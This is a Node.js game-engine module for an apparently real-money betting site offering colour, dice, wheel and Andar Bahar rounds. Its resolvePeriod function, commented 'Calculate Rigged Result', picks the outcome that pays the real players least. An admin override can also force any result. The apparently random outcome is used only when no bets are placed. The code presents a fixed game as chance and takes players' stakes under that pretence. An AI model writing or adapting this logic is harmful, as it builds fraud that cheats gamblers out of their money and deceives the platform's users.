const supabase = require('../config/supabase');

const EPOCH = 1783617840000;

const gameConfigs = [
  { game: 'FastParty', totalDuration: 60, bettingDuration: 30 },
  { game: 'PrimePick', totalDuration: 120, bettingDuration: 60 },
  { game: 'LuckyPick', totalDuration: 180, bettingDuration: 120 },
  { game: 'Dice', totalDuration: 60, bettingDuration: 30 },
  { game: 'Wheelocity', totalDuration: 60, bettingDuration: 30 },
  { game: 'AndarBahar', totalDuration: 60, bettingDuration: 30 }
];

const multipliersMap = {
  Green: 1.9, Red: 1.9, Violet: 4.5,
  green: 1.9, red: 1.9, violet: 4.5,
  '2 Hits': 1.9, '3 Hits': 3, '5 Hits': 5,
  Small: 1.9, Large: 1.9, Tie: 5,
  Andar: 1.9, Bahar: 1.9
};

const formatPeriodIndex = (periodIndex) => {
  const periodInCycle = (periodIndex % 999) + 1;
  return `${periodInCycle.toString().padStart(3, '0')}`;
};

const calculateTimerState = (totalDuration, bettingDuration, now = Date.now()) => {
  const elapsedSeconds = Math.floor((now - EPOCH) / 1000);
  const elapsedPeriods = Math.floor(elapsedSeconds / totalDuration);
  const secondsIntoCurrentBlock = elapsedSeconds % totalDuration;
  
  const isBettingOpen = secondsIntoCurrentBlock < bettingDuration;
  const period = formatPeriodIndex(elapsedPeriods);
  const previousPeriod = formatPeriodIndex(Math.max(0, elapsedPeriods - 1));
  
  // Calculate exact timestamps
  const blockStartMs = EPOCH + (elapsedPeriods * totalDuration * 1000);
  const bettingEndMs = blockStartMs + (bettingDuration * 1000);
  const blockEndMs = blockStartMs + (totalDuration * 1000);
  
  return { 
    period, 
    previousPeriod, 
    isBettingOpen, 
    secondsIntoCurrentBlock,
    startTime: new Date(blockStartMs),
    bettingEndTime: new Date(bettingEndMs),
    endTime: new Date(blockEndMs)
  };
};

// Deterministic Random
const deterministicRandom = (seed) => {
  let h = 0xdeadbeef;
  for(let i = 0; i < seed.length; i++) {
    h = Math.imul(h ^ seed.charCodeAt(i), 2654435761);
  }
  h = Math.imul(h ^ (h >>> 16), 2246822507);
  h ^= h >>> 13;
  return (h >>> 0) / 4294967296;
};

const getPossibleOutcomes = (gameType) => {
  const normalized = gameType.toLowerCase();
  if (normalized.includes('party') || normalized.includes('pick')) {
    return [
      { label: 'Green', color: ['#28a745'] },
      { label: 'Red', color: ['#dc3545'] },
      { label: 'Violet', color: ['#6f42c1'] },
    ];
  } else if (normalized.includes('wheelocity')) {
    return [
      { label: '2 Hits', color: ['#0ea5e9'] },
      { label: '3 Hits', color: ['#ff8cec'] },
      { label: '5 Hits', color: ['#88f29f'] },
    ];
  } else if (normalized.includes('dice')) {
    return [
      { label: 'Small', color: ['#0ea5e9'], number: 3 }, 
      { label: 'Large', color: ['#dc3545'], number: 10 },
      { label: 'Tie', color: ['#f1c40f'], number: 7 },
    ];
  } else if (normalized.includes('andar')) {
    return [
      { label: 'Andar', color: ['#007bff'], number: 'A' },
      { label: 'Bahar', color: ['#dc3545'], number: 'B' },
    ];
  }
  return [{ label: 'Green', color: ['#28a745'] }];
};

const generateBaseResult = (gameType, period) => {
  const rnd = deterministicRandom(gameType + period);
  let result = {};
  
  if (gameType === 'FastParty' || gameType === 'PrimePick' || gameType === 'LuckyPick') {
    const choices = ['Red', 'Green', 'Violet'];
    const selected = choices[Math.floor(rnd * choices.length)];
    result.label = selected;
    if (selected === 'Red') result.color = ['#dc3545'];
    if (selected === 'Green') result.color = ['#28a745'];
    if (selected === 'Violet') result.color = ['#6f42c1'];
  } else if (gameType === 'Wheelocity') {
    const choices = ['2 Hits', '3 Hits', '5 Hits'];
    const selected = choices[Math.floor(rnd * choices.length)];
    result.label = selected;
    if (selected === '2 Hits') result.color = ['#0ea5e9'];
    if (selected === '3 Hits') result.color = ['#ff8cec'];
    if (selected === '5 Hits') result.color = ['#88f29f'];
  } else if (gameType === 'Dice') {
    const sum = (Math.floor(rnd * 6) + 1) + (Math.floor(deterministicRandom(gameType + period + '-2') * 6) + 1);
    result.number = sum;
    if (sum === 7) {
      result.label = 'Tie'; result.color = ['#f1c40f'];
    } else if (sum >= 2 && sum <= 6) {
      result.label = 'Small'; result.color = ['#0ea5e9'];
    } else {
      result.label = 'Large'; result.color = ['#dc3545'];
    }
  } else if (gameType === 'AndarBahar') {
    const isAndar = rnd > 0.5;
    result.number = isAndar ? 'A' : 'B';
    result.label = isAndar ? 'Andar' : 'Bahar';
    result.color = isAndar ? ['#007bff'] : ['#dc3545'];
  }
  
  return result;
};



// ─── Settlement Logic ───
const resolvePeriod = async (gameConfig, period) => {
  const game = gameConfig.game;
  console.log(`[GameEngine] Resolving ${game} Period ${period}`);
  
  try {
    // 1. Fetch real pending bets
    const { data: realBets } = await supabase
      .from('bets')
      .select('*')
      .eq('game_type', game)
      .eq('period', period)
      .eq('status', 'pending');

    // 2. Fetch admin override from global_game_state
    const { data: stateRow } = await supabase
      .from('global_game_state')
      .select('admin_override')
      .eq('game', game)
      .single();
      
    const adminOverride = stateRow?.admin_override;
    
    // 3. Determine Final Result
    let finalResult = null;
    let maxProfit = -Infinity;
    
    // Only use REAL bets for AI logic so house actively profits against real players
    const allBets = (realBets || []).map(o => ({ select: o.selection, point: parseFloat(o.amount) }));
    const totalPool = allBets.reduce((sum, b) => sum + b.point, 0);

    if (adminOverride) {
      const overrideObj = typeof adminOverride === 'string' ? JSON.parse(adminOverride) : adminOverride;
      const outcomes = getPossibleOutcomes(game);
      const match = outcomes.find(o => String(o.label).toLowerCase().trim() === String(overrideObj.label).toLowerCase().trim());
      const base = generateBaseResult(game, period);
      finalResult = match ? { ...base, ...match } : { ...base, ...overrideObj };
      // Calculate profit for admin override
      let payout = 0;
      for (const bet of allBets) {
        if (String(bet.select).toLowerCase().trim() === String(finalResult.label).toLowerCase().trim()) {
          const multi = multipliersMap[bet.select] || multipliersMap[String(bet.select).toLowerCase().trim()] || 2;
          payout += bet.point * multi;
        }
      }
      maxProfit = totalPool - payout;
    } else {
      // Calculate Rigged Result
      if (allBets.length === 0) {
        finalResult = generateBaseResult(game, period);
        maxProfit = 0;
      } else {
        const outcomes = getPossibleOutcomes(game);
        let bestOutcome = null;
        
        for (const outcome of outcomes) {
          let payout = 0;
          for (const bet of allBets) {
            const betSel = String(bet.select).toLowerCase().trim();
            const outLbl = String(outcome.label).toLowerCase().trim();
            if (betSel === outLbl) {
              const multi = multipliersMap[bet.select] || multipliersMap[betSel] || 2;
              payout += bet.point * multi;
            }
          }
          const profit = totalPool - payout;
          if (profit > maxProfit) {
            maxProfit = profit;
            bestOutcome = outcome;
          }
        }
        
        const base = generateBaseResult(game, period);
        finalResult = bestOutcome ? { ...base, ...bestOutcome } : base;
      }
    }

    // 4. Save to game_results
    await supabase.from('game_results').upsert({
      game,
      period,
      result: finalResult,
      is_override: !!adminOverride,
      profit: maxProfit,
      total_bets: allBets.length,
      created_at: new Date().toISOString()
    }, { onConflict: 'game,period' });

    // 5. Settle real bets
    if (realBets && realBets.length > 0) {
      for (const bet of realBets) {
        const won = String(bet.selection).toLowerCase().trim() === String(finalResult.label).toLowerCase().trim();
        const multiplier = multipliersMap[bet.selection] || multipliersMap[String(bet.selection).toLowerCase().trim()] || 2;
        const payoutAmount = won ? parseFloat(bet.amount) * multiplier : 0;
        const betProfit = won ? payoutAmount - parseFloat(bet.amount) : -parseFloat(bet.amount);
        const newStatus = won ? 'won' : 'lost';

        let currentBalance = parseFloat(bet.wallet_before || 0);

        if (won && payoutAmount > 0) {
          // Credit wallet
          const { data: wallet } = await supabase.from('wallets').select('main_balance').eq('user_id', bet.user_id).single();
          if (wallet) {
            currentBalance = parseFloat(wallet.main_balance || 0);
            const newBalance = currentBalance + payoutAmount;
            
            await supabase.from('wallets').update({ main_balance: newBalance, updated_at: new Date().toISOString() }).eq('user_id', bet.user_id);
            
            await supabase.from('transactions').insert({
              user_id: bet.user_id,
              amount: payoutAmount,
              type: 'Win',
              status: 'Success',
              notes: `${game} Period ${period} — Won`,
              previous_balance: currentBalance,
              new_balance: newBalance
            });
            currentBalance = newBalance;
          }
        }

        await supabase.from('bets').update({ 
          result: finalResult.label, 
          payout: payoutAmount, 
          status: newStatus,
          profit: betProfit,
          wallet_after: currentBalance
        }).eq('id', bet.id);
      }
    }
    
    // Clean up admin override for next period
    if (adminOverride) {
      await supabase.from('global_game_state').update({ admin_override: null }).eq('game', game);
    }
    
  } catch (err) {
    console.error(`[GameEngine Error] Failed to resolve ${game} ${period}:`, err.message);
  }
};

// ─── Main Loop ───
// We keep track of the last processed phase for each game to avoid redundant DB writes
const lastStateMap = {};

const tick = async () => {
  const now = Date.now();
  
  for (const config of gameConfigs) {
    const state = calculateTimerState(config.totalDuration, config.bettingDuration, now);
    const game = config.game;
    
    // Status can be 'betting' or 'resolving'
    const currentStatus = state.isBettingOpen ? 'betting' : 'resolving';
    const stateKey = `${state.period}-${currentStatus}`;
    
    if (lastStateMap[game] !== stateKey) {
      lastStateMap[game] = stateKey;
      
      // Update the global state table so clients get Realtime events
      await supabase.from('global_game_state').upsert({
        game,
        period: state.period,
        start_time: state.startTime.toISOString(),
        end_time: state.endTime.toISOString(),
        status: currentStatus,
        updated_at: new Date(now).toISOString()
      }, { onConflict: 'game' });
      
      // If we just transitioned TO betting, it means a new period started,
      // and the PREVIOUS period needs to be resolved.
      // Note: we can also resolve right when betting closes. Resolving when betting closes is better
      // so users see results immediately.
      
      if (currentStatus === 'resolving') {
        // Trigger resolution for the CURRENT period since betting just closed
        resolvePeriod(config, state.period);
      }
    }
  }
};

const startGameEngine = () => {
  console.log('🎮 [GameEngine] Starting Global Game Engine...');
  // Run tick every 500ms for precision
  setInterval(tick, 500);
};

module.exports = startGameEngine;
